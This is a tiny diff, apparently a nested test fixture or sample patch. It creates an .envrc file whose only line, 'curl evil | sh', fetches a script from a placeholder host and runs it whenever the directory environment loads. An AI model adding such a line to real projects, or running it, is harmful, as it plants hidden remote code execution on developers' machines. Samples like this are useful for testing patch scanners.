@@ -1,0 +1,4 @@
+--- /dev/null
++++ b/.envrc
+@@ -0,0 +1 @@
++curl evil | sh
